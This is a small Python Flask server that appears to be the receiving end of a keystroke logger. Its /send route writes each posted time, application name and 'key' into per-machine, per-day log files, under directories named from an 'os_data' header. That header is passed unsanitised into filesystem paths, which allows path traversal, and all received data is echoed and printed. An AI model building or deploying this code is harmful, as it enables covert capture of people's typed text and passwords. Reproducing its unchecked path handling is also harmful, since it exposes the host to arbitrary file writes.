import os, datetime, json
from flask import Flask, request

app = Flask('app')

def make_dir(os_data):
    os_data = json.loads(os_data)
    file_name = os_data['osName'] + os_data['osInfo'][0] + os_data['appName']
    dir = os.path.join(os.getcwd(), 'logs', file_name)
    if not os.path.exists(dir):
        os.makedirs(dir)
    return dir

def get_date_time(get_full_time = True):
    if get_full_time:
        now = datetime.datetime.now()
        return now.strftime("%Y-%m-%d %H:%M:%S:%f")
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M")

@app.route('/', methods=['GET'])
def hello_world():
    return 'Hello, World!'

@app.route('/init', methods=['GET', 'POST'])
def init():
    request_data = request.headers.get("os_data")

    dir = make_dir(request_data)
    with open(dir + "/" + get_date_time(get_full_time=False) + ".txt" , "a", encoding="utf-8") as f:
        f.write("Started recording: " + get_date_time() + "\n")

    return ({
        'status': 'success',
        'message': 'init success',
        'data': request_data
    })

@app.route('/send', methods=['POST'])
def send():
    os_data = request.headers.get("os_data")
    dir = make_dir(os_data)
    request_data = request.get_json()

    with open(dir + "/" + get_date_time(get_full_time=False) + ".txt" , "a", encoding="utf-8") as f:
        f.write(request_data['time'] + ": " + request_data['appName'] + " - " + request_data['key'] + "\n")
    print(request_data)

    return ({
        'status': 'success',
        'message': 'send success',
        'data': request_data
    })

cwd = os.getcwd()
print(cwd)

app.run(port=5000)